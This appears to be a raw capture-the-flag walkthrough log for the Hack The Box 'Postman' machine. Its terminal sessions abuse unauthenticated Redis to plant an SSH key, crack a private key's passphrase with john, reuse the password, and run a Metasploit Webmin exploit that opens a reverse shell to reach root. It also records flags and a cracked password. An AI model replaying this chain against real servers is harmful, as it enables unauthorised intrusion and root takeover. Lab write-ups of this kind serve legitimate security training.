@@ -1,0 +1,200 @@
+
+https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
+root@kali:~/HTB/Postman# telnet 10.10.10.160 6379
+Trying 10.10.10.160...
+Connected to 10.10.10.160.
+Escape character is '^]'.
+echo "Hey no AUTH required!"
+$21
+Hey no AUTH required!
+
+Generate ssh keys
+
+root@kali:~/HTB/Postman# (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
+
+1. 
+
+root@kali:~/HTB/Postman# redis-cli -h 10.10.10.160 flushall
+OK
+root@kali:~/HTB/Postman# cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
+OK
+root@kali:~/HTB/Postman# redis-cli -h 10.10.10.160
+10.10.10.160:6379> config set dbfilename "authorized_keys"
+OK
+10.10.10.160:6379> save
+OK
+10.10.10.160:6379> exit
+root@kali:~/HTB/Postman# ssh -i id_rsa redis@10.10.10.160
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Thu Nov  7 18:18:26 2019 from 10.10.15.95
+redis@Postman:~$ whoami
+redis
+redis@Postman:~$ ls 
+
+2. 
+
+root@kali:~/HTB/Postman# redis-cli -h 10.10.10.160 flushall
+OK
+root@kali:~/HTB/Postman# cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
+OK
+root@kali:~/HTB/Postman# redis-cli -h 10.10.10.160
+10.10.10.160:6379> config set dir /var/lib/redis/.ssh/
+OK
+(8.07s)
+10.10.10.160:6379> config set dbfilename "authorized_keys"
+OK
+(2.09s)
+10.10.10.160:6379> save
+OK
+(1.79s)
+10.10.10.160:6379> exit
+root@kali:~/HTB/Postman# ssh -i id_rsa redis@10.10.10.160
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Thu Nov  7 18:44:51 2019 from 10.10.15.27
+redis@Postman:~$ ls -a
+.   6379	     .bash_history  dkixshbr.so  .gnupg       .local	pzrgeyaj.so  .ssh
+..  authorized_keys  .cache	    dump.rdb	 ibortfgq.so  module.o	qcbxxlig.so  vlpaulhk.so
+
+Found ssh keys at 
+redis@Postman:~$ locate .bak
+/opt/id_rsa.bak
+
+root@kali:~/HTB/Postman/www# cp id_rsa.bak id_rsa
+root@kali:~/HTB/Postman/www# python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
+root@kali:~/HTB/Postman/www# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+computer2008     (id_rsa)
+1g 0:00:00:20 DONE (2019-11-07 20:19) 0.04967g/s 712453p/s 712453c/s 712453C/sa6_123..*7¡Vamos!
+Session completed
+
+
+root@kali:~/HTB/Postman# ssh -i id_rsa.bak Matt@10.10.10.160
+Enter passphrase for key 'id_rsa.bak': computer2008
+Connection closed by 10.10.10.160 port 22
+
+
+redis@Postman:~$ su Matt
+Password: computer2008
+Matt@Postman:/var/lib/redis$ cd /home
+Matt@Postman:/home$ ls -a
+.  ..  Matt
+Matt@Postman:/home$ cd Matt
+Matt@Postman:~$ cat user.txt
+517ad0ec2458ca97af8d93aac08a2f3c
+Matt@Postman:~$ 
+
+
+creds also work on webmin web portal
+Matt:computer2008
+
+
+msf5 exploit(linux/http/webmin_packageup_rce) > show info
+
+       Name: Webmin Package Updates Remote Command Execution
+     Module: exploit/linux/http/webmin_packageup_rce
+   Platform: Unix
+       Arch: cmd
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2019-05-16
+
+Provided by:
+  AkkuS <Özkan Mustafa Akkuş>
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Webmin <= 1.910
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  PASSWORD                    yes       Webmin Password
+  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOSTS                      yes       The target address range or CIDR identifier
+  RPORT      10000            yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /                yes       Base path for Webmin application
+  USERNAME                    yes       Webmin Username
+  VHOST                       no        HTTP server virtual host
+
+Payload information:
+  Space: 512
+
+Description:
+  This module exploits an arbitrary command execution vulnerability in 
+  Webmin 1.910 and lower versions. Any user authorized to the "Package 
+  Updates" module can execute arbitrary commands with root privileges.
+
+References:
+  https://cvedetails.com/cve/CVE-2019-12840/
+  https://www.pentest.com.tr/exploits/Webmin-1910-Package-Updates-Remote-Command-Execution.html
+
+msf5 exploit(linux/http/webmin_packageup_rce) > set password computer2008
+password => computer2008
+msf5 exploit(linux/http/webmin_packageup_rce) > set username Matt
+username => Matt
+msf5 exploit(linux/http/webmin_packageup_rce) > set rhosts 10.10.10.160
+rhosts => 10.10.10.160
+msf5 exploit(linux/http/webmin_packageup_rce) > set rhosts postman
+rhosts => postman
+msf5 exploit(linux/http/webmin_packageup_rce) > run
+
+[-] Exploit failed: The following options failed to validate: LHOST.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/http/webmin_packageup_rce) > set lhost 10.10.16.63
+lhost => 10.10.16.63
+msf5 exploit(linux/http/webmin_packageup_rce) > run
+
+[*] Started reverse TCP handler on 10.10.16.63:4444 
+[-] Exploit failed: Errno::ENOTCONN Transport endpoint is not connected - getpeername(2)
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/http/webmin_packageup_rce) > set ssl true
+ssl => true
+msf5 exploit(linux/http/webmin_packageup_rce) > run
+
+[*] Started reverse TCP handler on 10.10.16.63:4444 
+[+] Session cookie: e2dc2788596bbccc521d35d242af6f59
+[*] Attempting to execute the payload...
+[*] Command shell session 1 opened (10.10.16.63:4444 -> 10.10.10.160:34604) at 2019-11-07 20:59:59 +0100
+
+
+
+whoami
+root
+cat /root/root.txt
+a257741c5bed8be7778c6ed95686ddce
+
